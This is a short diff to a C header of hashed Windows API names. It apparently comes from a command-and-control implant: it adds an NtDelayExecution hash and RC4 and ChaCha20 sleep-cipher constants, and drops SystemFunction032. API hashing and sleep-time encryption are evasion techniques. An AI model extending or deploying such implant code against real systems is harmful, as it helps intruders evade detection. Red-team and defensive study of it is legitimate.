@@ -103,6 +103,7 @@
 #define H_FUNC_NTDUPLICATETOKEN                      0x8e160b23
 #define H_FUNC_NTALERTRESUMETHREAD                   0x5ba11e28
 #define H_FUNC_NTTESTALERT                           0x858a32df
+#define H_FUNC_NTDELAYEXECUTION                      0xf5a936aa
 #define H_FUNC_RTLALLOCATEHEAP                       0x3be94c5a
 #define H_FUNC_RTLREALLOCATEHEAP                     0xaf740371
 #define H_FUNC_RTLFREEHEAP                           0x73a9e4d7
@@ -150,7 +151,10 @@
 #define H_FUNC_SYSTEMTIMETOTZSPECIFICLOCALTIME       0x77b0aa6a
 #define H_FUNC_OUTPUTDEBUGSTRINGA                    0x490fc1d5
 #define H_FUNC_DEBUGBREAK                            0xd08caa91
-#define H_FUNC_SYSTEMFUNCTION032                     0xe58c8805
+/* HVC-045: SystemFunction032 removed; ciphers are compiled in - no runtime resolution needed */
+/* Sleep cipher type constants stored in Config.Implant.SleepCipher */
+#define SLEEP_CIPHER_RC4                             0
+#define SLEEP_CIPHER_CHACHA20                        1
 #define H_FUNC_LOOKUPACCOUNTSIDW                     0xd51fdfa3
 #define H_FUNC_LOGONUSEREXW                          0x6ba383b7
 #define H_FUNC_VSNPRINTF                             0xe212f2ef
